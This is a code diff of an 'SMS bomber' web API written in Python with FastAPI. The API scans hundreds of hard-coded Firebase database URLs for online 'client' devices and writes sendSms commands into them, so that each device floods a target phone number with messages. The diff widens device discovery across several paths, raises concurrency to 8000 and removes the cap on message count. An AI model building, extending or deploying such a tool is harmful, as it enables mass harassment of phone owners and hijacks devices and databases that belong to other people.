@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 @BRONX_ULTRA BOMBER API v9.0 — ULTRA FLASH        ║
-║   ▸ Hidden Firebase (only owner key)                    ║
-║   ▸ ALL Firebase (261+ supported)                       ║
-║   ▸ REAL Online Devices Only                            ║
-║   ▸ 1 count = 1 SMS (no multiple)                       ║
-║   ▸ Proper STOP working                                 ║
-║   ▸ Render + Vercel Ready                               ║
+║   🔥 @BRONX_ULTRA BOMBER API v9.0 — ULTRA PRO          ║
+║   ▸ Hidden Owner Key (bronx-boss)                       ║
+║   ▸ Multi-Path Device Fetch (ALL online devices)        ║
+║   ▸ Strict Count (no repeat, no spam)                   ║
+║   ▸ Real-Time Stop                                      ║
+║   ▸ Firebase URLs Hidden from public keys               ║
+║   ▸ Render / Uptime / Vercel Ready                      ║
 ╚══════════════════════════════════════════════════════════╝
 """
 
@@ -26,10 +26,9 @@ from fastapi.middleware.cors import CORSMiddleware
 # ═══════════════════════════════════════════════════════════
 # 🔑 API KEYS
 # ═══════════════════════════════════════════════════════════
-OWNER_KEY = "bronx-boss"   # 🔒 Only THIS key can see firebase list
+OWNER_KEY = "bronx-boss"
 
-VALID_KEYS = {
-    OWNER_KEY,
+PUBLIC_KEYS = {
     "bronx-op",
     "prime-key",
     "flash-key",
@@ -38,13 +37,15 @@ VALID_KEYS = {
     "bronx-max",
 }
 
+VALID_KEYS = PUBLIC_KEYS | {OWNER_KEY}
+
+
 # ═══════════════════════════════════════════════════════════
-# 🔥 FIREBASE URLs — ADD 100-500+ HERE
+# 🔥 FIREBASE URLs — ADD AS MANY AS YOU WANT (auto dedupe)
 # ═══════════════════════════════════════════════════════════
-FIREBASE_URLS = [
-    # ── Add all your firebase URLs here ─────────────────────
+FIREBASE_URLS_RAW = [
     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-        "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
     "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
     "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
     "https://rambhai-2c356-default-rtdb.firebaseio.com",
@@ -332,8 +333,26 @@ FIREBASE_URLS = [
 "https://mr-sapyedr-default-rtdb.firebaseio.com",
 ]
 
-# Auto-dedupe
-FIREBASE_URLS = list(dict.fromkeys([u.rstrip("/") for u in FIREBASE_URLS]))
+# Auto-dedupe + clean
+def _clean(u: str) -> str:
+    u = u.strip().rstrip("/")
+    if u.endswith(".json"):
+        u = u[:-5]
+    return u.rstrip("/")
+
+FIREBASE_URLS = list(dict.fromkeys(_clean(u) for u in FIREBASE_URLS_RAW if u.strip()))
+
+
+# ═══════════════════════════════════════════════════════════
+# 📡 DEVICE FETCH PATHS (multi-path = more devices found)
+# ═══════════════════════════════════════════════════════════
+CLIENT_PATHS = [
+    "/clients.json",
+    "/clients",
+    "/clients/.json",
+    "/.json",
+    "/",
+]
 
 SEND_ENDPOINTS = [
     "clients/{id}/webhookEvent/sendSms.json",
@@ -346,11 +365,12 @@ SEND_ENDPOINTS = [
 # ═══════════════════════════════════════════════════════════
 # ⚙️ SETTINGS
 # ═══════════════════════════════════════════════════════════
-MAX_CONCURRENT = 5000
+MAX_CONCURRENT = 8000
 BATCH_CHUNK = 2000
 REQUEST_TIMEOUT = 6
 CONNECT_TIMEOUT = 2
-DEVICE_CACHE_TTL = 30
+DEVICE_CACHE_TTL = 20
+STOP_CHECK_EVERY = 200   # har 200 requests pe stop check
 
 API_NAME = "@BRONX_ULTRA"
 API_VERSION = "9.0"
@@ -358,12 +378,7 @@ API_VERSION = "9.0"
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
 # ═══════════════════════════════════════════════════════════
-app = FastAPI(
-    title=f"🔥 {API_NAME} BOMBER API",
-    version=API_VERSION,
-    description="Ultra Firebase Bomber — v9.0",
-)
-
+app = FastAPI(title=f"🔥 {API_NAME} BOMBER API", version=API_VERSION)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -372,7 +387,7 @@ app.add_middleware(
 )
 
 # ═══════════════════════════════════════════════════════════
-# 🔴 REDIS (OPTIONAL)
+# 🔴 REDIS (optional)
 # ═══════════════════════════════════════════════════════════
 redis = None
 try:
@@ -393,46 +408,27 @@ _DEVICE_CACHE = {"devices": None, "ts": 0}
 # ═══════════════════════════════════════════════════════════
 # 🔑 KEY HELPERS
 # ═══════════════════════════════════════════════════════════
-def verify_key(api_key: str) -> bool:
-    return bool(api_key) and api_key.strip() in VALID_KEYS
+def verify_key(k: str) -> bool:
+    return bool(k) and k.strip() in VALID_KEYS
 
+def is_owner(k: str) -> bool:
+    return bool(k) and k.strip() == OWNER_KEY
 
-def is_owner(api_key: str) -> bool:
-    return bool(api_key) and api_key.strip() == OWNER_KEY
-
-
-def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
-    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
-    if key:
-        return key
-    auth = request.headers.get("authorization", "")
-    if auth.lower().startswith("bearer "):
-        return auth[7:].strip()
-    key = query_params.get("key") or query_params.get("api_key")
-    if key:
-        return key
-    key = body_data.get("key") or body_data.get("api_key")
-    if key:
-        return key
-    return ""
+def extract_key(request: Request, q: dict, b: dict) -> str:
+    k = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
+    if k: return k
+    a = request.headers.get("authorization", "")
+    if a.lower().startswith("bearer "): return a[7:].strip()
+    return q.get("key") or q.get("api_key") or b.get("key") or b.get("api_key") or ""
 
 
 # ═══════════════════════════════════════════════════════════
-# 🛠️ HELPERS
+# 🛠️ MESSAGE FIX (full symbol / emoji / space)
 # ═══════════════════════════════════════════════════════════
-def clean_url(url: str) -> str:
-    url = url.rstrip("/")
-    if url.endswith(".json"):
-        url = url[:-5]
-    return url.rstrip("/")
-
-
-def fix_message(raw_message, is_get: bool) -> str:
-    if raw_message is None:
-        return ""
-    if not isinstance(raw_message, str):
-        raw_message = str(raw_message)
-    msg = raw_message
+def fix_message(raw, is_get: bool) -> str:
+    if raw is None: return ""
+    if not isinstance(raw, str): raw = str(raw)
+    msg = raw
     if is_get:
         msg = msg.replace("+", " ")
     msg = msg.replace("\\n", "\n").replace("\\t", "\t")
@@ -440,30 +436,49 @@ def fix_message(raw_message, is_get: bool) -> str:
 
 
 # ═══════════════════════════════════════════════════════════
-# 📡 FETCH DEVICES (STRICT — only truly online)
+# 📡 DEVICE FETCH — MULTI PATH (FIX: found more devices)
 # ═══════════════════════════════════════════════════════════
+def _is_online(v: dict) -> bool:
+    if not isinstance(v, dict): return False
+    s = v.get("status")
+    if s is True: return True
+    if isinstance(s, str) and s.lower() in ("true", "online", "active", "1"): return True
+    if v.get("isOnline") is True: return True
+    if v.get("online") is True: return True
+    return False
+
+
 async def fetch_devices_from(session, url):
-    base = clean_url(url)
-    try:
-        async with session.get(f"{base}/clients.json") as r:
-            if r.status != 200:
-                return []
-            data = await r.json(content_type=None)
-            if not isinstance(data, dict):
-                return []
-            out = []
-            for k, v in data.items():
-                if not isinstance(v, dict):
-                    continue
-                # STRICT: only if status is True
-                if v.get("status") is True:
-                    out.append({"id": k, "url": base})
-            return out
-    except Exception:
-        return []
+    base = _clean(url)
+    found = []
+    tried = set()
+
+    for path in CLIENT_PATHS:
+        full = f"{base}{path}"
+        if full in tried: continue
+        tried.add(full)
+        try:
+            async with session.get(full) as r:
+                if r.status != 200: continue
+                data = await r.json(content_type=None)
+                if not isinstance(data, dict): continue
+
+                # direct clients map
+                clients = data.get("clients") if isinstance(data.get("clients"), dict) else data
+
+                for k, v in clients.items():
+                    if isinstance(v, dict) and _is_online(v):
+                        found.append({"id": k, "url": base})
+
+                if found:
+                    break  # mil gaya, aage mat try karo
+        except Exception:
+            continue
+
+    return found
 
 
-async def get_all_devices(session, use_cache=False):
+async def get_all_devices(session, use_cache=True):
     if use_cache:
         age = time.time() - _DEVICE_CACHE["ts"]
         if _DEVICE_CACHE["devices"] and age < DEVICE_CACHE_TTL:
@@ -473,10 +488,17 @@ async def get_all_devices(session, use_cache=False):
         *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
         return_exceptions=True,
     )
+
+    # dedupe by (url, id)
+    seen = set()
     out = []
     for r in results:
-        if isinstance(r, list):
-            out.extend(r)
+        if not isinstance(r, list): continue
+        for d in r:
+            key = (d["url"], d["id"])
+            if key in seen: continue
+            seen.add(key)
+            out.append(d)
 
     _DEVICE_CACHE["devices"] = out
     _DEVICE_CACHE["ts"] = time.time()
@@ -484,10 +506,13 @@ async def get_all_devices(session, use_cache=False):
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 SEND ONE
+# 💣 SEND ONE — NO RETRY, NO DUPLICATE
 # ═══════════════════════════════════════════════════════════
-async def send_one(session, device, target, message, sem, stats):
+async def send_one(session, device, target, message, sem, stats, stop_event):
     async with sem:
+        if stop_event.is_set():
+            return False
+
         payload = {
             "from": 1,
             "to": target,
@@ -495,7 +520,10 @@ async def send_one(session, device, target, message, sem, stats):
             "isSended": False,
             "timestamp": int(time.time() * 1000),
         }
+
         for ep in SEND_ENDPOINTS:
+            if stop_event.is_set():
+                return False
             url = f"{device['url']}/{ep.format(id=device['id'])}"
             try:
                 async with session.put(url, json=payload) as r:
@@ -507,6 +535,7 @@ async def send_one(session, device, target, message, sem, stats):
                         return False
             except Exception:
                 continue
+
         stats["failed"] += 1
         return False
 
@@ -516,31 +545,28 @@ async def is_stopped(number: str) -> bool:
         return True
     if redis:
         try:
-            val = await redis.get(f"stop:{number}")
-            return val is not None
+            v = await redis.get(f"stop:{number}")
+            return v is not None
         except Exception:
             return False
     return False
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 WORKER — 1 COUNT = 1 SMS PER DEVICE
+# 💣 WORKER — STRICT COUNT + REAL STOP
 # ═══════════════════════════════════════════════════════════
 async def bomb_worker(number: str, message: str, count: int, api_key: str):
     jid = str(uuid4())[:8]
     t0 = time.time()
 
     if redis:
-        try:
-            await redis.delete(f"stop:{number}")
-        except Exception:
-            pass
+        try: await redis.delete(f"stop:{number}")
+        except Exception: pass
     _LOCAL_STOP.discard(number)
 
     connector = aiohttp.TCPConnector(
-        limit=0, limit_per_host=0,
-        ttl_dns_cache=600, force_close=False,
-        enable_cleanup_closed=True, use_dns_cache=True,
+        limit=0, limit_per_host=0, ttl_dns_cache=600,
+        force_close=False, enable_cleanup_closed=True, use_dns_cache=True,
     )
     timeout = aiohttp.ClientTimeout(
         total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT,
@@ -551,66 +577,68 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
         "Connection": "keep-alive",
     }
 
-    async with aiohttp.ClientSession(
-        connector=connector, timeout=timeout, headers=headers
-    ) as session:
-        devices = await get_all_devices(session, use_cache=False)   # always fresh
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
+        devices = await get_all_devices(session, use_cache=True)
         if not devices:
-            print(f"[{jid}] ❌ No online devices")
+            print(f"[{jid}] ❌ No devices online")
             return
 
         ndev = len(devices)
         total = ndev * count
 
         print(f"\n{'='*60}")
-        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION}")
-        print(f"[{jid}] Target  : {number}")
-        print(f"[{jid}] Message : {message[:60]}")
-        print(f"[{jid}] Devices : {ndev} online")
-        print(f"[{jid}] Count   : {count}/device")
-        print(f"[{jid}] TOTAL   : {total} SMS")
+        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — ULTRA PRO")
+        print(f"[{jid}] Key        : {api_key}")
+        print(f"[{jid}] Target     : {number}")
+        print(f"[{jid}] Message    : {message[:60]}")
+        print(f"[{jid}] Devices    : {ndev}")
+        print(f"[{jid}] Per-device : {count}")
+        print(f"[{jid}] TOTAL SMS  : {total}")
         print(f"{'='*60}")
 
         sem = asyncio.Semaphore(MAX_CONCURRENT)
         stats = {"success": 0, "failed": 0, "blocked": 0}
+        stop_event = asyncio.Event()
 
         all_tasks = []
         for device in devices:
-            for _ in range(count):
+            for _ in range(count):   # ✅ STRICT: exact count only
                 all_tasks.append(
-                    send_one(session, device, number, message, sem, stats)
+                    send_one(session, device, number, message, sem, stats, stop_event)
                 )
 
         total_tasks = len(all_tasks)
-        print(f"[{jid}] 🚀 Firing {total_tasks} requests...")
+        print(f"[{jid}] 🚀 Firing {total_tasks} requests (sem={MAX_CONCURRENT})...")
 
         completed = 0
         cancelled = False
         for i in range(0, total_tasks, BATCH_CHUNK):
-            # ✅ STOP CHECK — turant break
+            # ── REAL-TIME STOP CHECK ──
             if await is_stopped(number):
                 print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
+                stop_event.set()
                 cancelled = True
                 for t in all_tasks[i:]:
                     t.cancel()
                 break
 
             chunk = all_tasks[i:i + BATCH_CHUNK]
-            await asyncio.gather(*chunk, return_exceptions=True)
+            try:
+                await asyncio.gather(*chunk, return_exceptions=True)
+            except asyncio.CancelledError:
+                cancelled = True
+                break
             completed += len(chunk)
 
-            elapsed_sf = time.time() - t0
-            speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
-            print(f"[{jid}] ⚡ {completed}/{total_tasks} | OK={stats['success']} | "
-                  f"BLK={stats['blocked']} | {elapsed_sf:.1f}s | {speed_sf}/s")
+            el = time.time() - t0
+            sp = round(stats["success"] / el, 1) if el else 0
+            print(f"[{jid}] ⚡ {completed}/{total_tasks} | OK={stats['success']} | BLK={stats['blocked']} | {el:.1f}s | {sp}/s")
 
-        elapsed = round(time.time() - t0, 2)
-        speed = round(stats["success"] / elapsed, 1) if elapsed else 0
-
+        el = round(time.time() - t0, 2)
+        sp = round(stats["success"] / el, 1) if el else 0
         print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
-        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
-              f"Blocked={stats['blocked']}")
-        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
+        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | Blocked={stats['blocked']}")
+        print(f"[{jid}] Time={el}s | Speed={sp}/s 🚄")
         print(f"{'='*60}\n")
 
 
@@ -624,24 +652,21 @@ async def root():
         "version": API_VERSION,
         "status": "🔥 ONLINE",
         "protected": True,
-        "firebases_loaded": len(FIREBASE_URLS),   # ✅ count dikhega, list nahi
+        "total_firebases": len(FIREBASE_URLS),
         "redis": "connected" if redis else "off",
+        "mode": "ULTRA PRO — all devices × count",
         "how_to_use": {
             "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=1",
             "stop": "/stop?key=YOUR_KEY&number=9876543210",
+            "devices": "/devices?key=YOUR_KEY",
         },
-        "tip": "count=1 → 1 SMS per online device",
     }
 
 
 @app.get("/health")
 async def health():
-    return {
-        "api": API_NAME,
-        "version": API_VERSION,
-        "status": "ok",
-        "time": datetime.now().isoformat(),
-    }
+    return {"api": API_NAME, "version": API_VERSION, "status": "ok",
+            "time": datetime.now().isoformat()}
 
 
 # ═══════════════════════════════════════════════════════════
@@ -650,27 +675,28 @@ async def health():
 @app.api_route("/send", methods=["GET", "POST"])
 async def send_endpoint(request: Request, bg: BackgroundTasks):
     is_get = request.method == "GET"
-    query_data = dict(request.query_params)
-    body_data = {}
+    q = dict(request.query_params)
+
+    b = {}
     if not is_get:
-        try:
-            body_data = await request.json()
+        try: b = await request.json()
         except Exception:
             try:
                 form = await request.form()
-                body_data = dict(form)
-            except Exception:
-                body_data = {}
+                b = dict(form)
+            except Exception: b = {}
 
-    merged = {**query_data, **body_data}
-    api_key = extract_key(request, query_data, body_data)
+    merged = {**q, **b}
 
+    api_key = extract_key(request, q, b)
     if not api_key:
         return JSONResponse({"success": False, "error": "🔑 API key required"}, 401)
     if not verify_key(api_key):
         return JSONResponse({"success": False, "error": "❌ Invalid API key"}, 401)
 
-    message = fix_message(merged.get("message") or merged.get("msg") or "", is_get)
+    raw_message = merged.get("message") or merged.get("msg") or ""
+    message = fix_message(raw_message, is_get)
+
     number = str(merged.get("number") or merged.get("num") or "").strip()
     count_str = merged.get("count", "1")
 
@@ -685,10 +711,9 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
 
     try:
         count = int(count_str)
-        if count <= 0 or count > 1000:
-            raise ValueError
+        if count <= 0: raise ValueError
     except Exception:
-        return JSONResponse({"success": False, "error": "invalid count (1-1000)"}, 400)
+        return JSONResponse({"success": False, "error": "invalid count"}, 400)
 
     bg.add_task(bomb_worker, clean_number, message, count, api_key)
 
@@ -697,29 +722,25 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
         "api": API_NAME,
         "version": API_VERSION,
         "job_started": True,
+        "key_used": api_key,
         "target": clean_number,
         "message_sent": message,
+        "message_length": len(message),
         "per_device": count,
-        "mode": "REAL ONLINE DEVICES ONLY",
-        "note": "Total = online devices × count",
+        "mode": "ULTRA PRO FAN-OUT",
         "stop_url": f"/stop?key={api_key}&number={clean_number}",
     }
 
 
 # ═══════════════════════════════════════════════════════════
-# 🛑 /stop — PROPER STOP
+# 🛑 /stop
 # ═══════════════════════════════════════════════════════════
 @app.get("/stop")
-async def stop_endpoint(
-    request: Request,
-    number: str = Query(None),
-    key: str = Query(None),
-):
+async def stop_endpoint(request: Request, number: str = Query(None), key: str = Query(None)):
     api_key = key or request.headers.get("x-api-key") or ""
     if not api_key:
-        auth = request.headers.get("authorization", "")
-        if auth.lower().startswith("bearer "):
-            api_key = auth[7:].strip()
+        a = request.headers.get("authorization", "")
+        if a.lower().startswith("bearer "): api_key = a[7:].strip()
 
     if not verify_key(api_key):
         return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)
@@ -729,51 +750,26 @@ async def stop_endpoint(
     number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
     _LOCAL_STOP.add(number)
     if redis:
-        try:
-            await redis.set(f"stop:{number}", "1", ex=300)
-        except Exception:
-            pass
+        try: await redis.set(f"stop:{number}", "1", ex=300)
+        except Exception: pass
 
-    return {
-        "success": True,
-        "api": API_NAME,
-        "message": f"🛑 Stop signal sent for {number}",
-        "number": number,
-    }
+    return {"success": True, "api": API_NAME,
+            "message": f"🛑 Stop signal sent for {number}", "number": number}
 
 
 # ═══════════════════════════════════════════════════════════
-# 📱 /devices — HIDDEN for non-owner
+# 📱 /devices — Firebase URLs HIDDEN for public keys
 # ═══════════════════════════════════════════════════════════
 @app.get("/devices")
 async def devices_endpoint(request: Request, key: str = Query(None)):
     api_key = key or request.headers.get("x-api-key") or ""
     if not api_key:
-        auth = request.headers.get("authorization", "")
-        if auth.lower().startswith("bearer "):
-            api_key = auth[7:].strip()
+        a = request.headers.get("authorization", "")
+        if a.lower().startswith("bearer "): api_key = a[7:].strip()
 
     if not verify_key(api_key):
         return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)
 
-    # ✅ PUBLIC: only count dikhega, list NAHI
-    if not is_owner(api_key):
-        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
-        timeout = aiohttp.ClientTimeout(total=15, connect=5)
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            devices = await get_all_devices(session, use_cache=False)
-
-        return {
-            "success": True,
-            "api": API_NAME,
-            "version": API_VERSION,
-            "total_online": len(devices),
-            "live_firebases": len(set(d["url"] for d in devices)),
-            "total_firebases": len(FIREBASE_URLS),
-            "note": "🔒 Detailed device list is private (owner only)",
-        }
-
-    # ✅ OWNER: full details
     connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
     timeout = aiohttp.ClientTimeout(total=20, connect=5)
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -783,54 +779,50 @@ async def devices_endpoint(request: Request, key: str = Query(None)):
     for d in devices:
         fb_group[d["url"]] += 1
 
-    return {
+    resp = {
         "success": True,
         "api": API_NAME,
         "version": API_VERSION,
-        "owner_mode": True,
         "total_online": len(devices),
         "live_firebases": len(fb_group),
         "total_firebases": len(FIREBASE_URLS),
-        "per_firebase": dict(fb_group),
-        "devices": devices,
     }
+
+    # ✅ Owner ko full details, public ko sirf count
+    if is_owner(api_key):
+        resp["per_firebase"] = dict(fb_group)
+        resp["devices"] = devices
+
+    return resp
 
 
 # ═══════════════════════════════════════════════════════════
-# 🌐 /firebases — OWNER ONLY
+# 🌐 /firebases — ONLY OWNER (bronx-boss)
 # ═══════════════════════════════════════════════════════════
 @app.get("/firebases")
 async def firebases_endpoint(request: Request, key: str = Query(None)):
     api_key = key or request.headers.get("x-api-key") or ""
     if not api_key:
-        auth = request.headers.get("authorization", "")
-        if auth.lower().startswith("bearer "):
-            api_key = auth[7:].strip()
+        a = request.headers.get("authorization", "")
+        if a.lower().startswith("bearer "): api_key = a[7:].strip()
 
     if not verify_key(api_key):
         return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)
 
-    # 🔒 Only owner sees firebase list
     if not is_owner(api_key):
         return JSONResponse(
-            {
-                "success": False,
-                "api": API_NAME,
-                "error": "🔒 Owner key required to view firebase list",
-                "hint": "Firebase URLs are private",
-            },
+            {"success": False, "error": "🚫 Owner access only"},
             403,
         )
 
     return {
+        "success": True,
         "api": API_NAME,
         "version": API_VERSION,
-        "success": True,
-        "owner_mode": True,
         "total": len(FIREBASE_URLS),
         "firebases": FIREBASE_URLS,
     }
 
 
-# Vercel handler
+# Vercel / Render handler
 handler = app
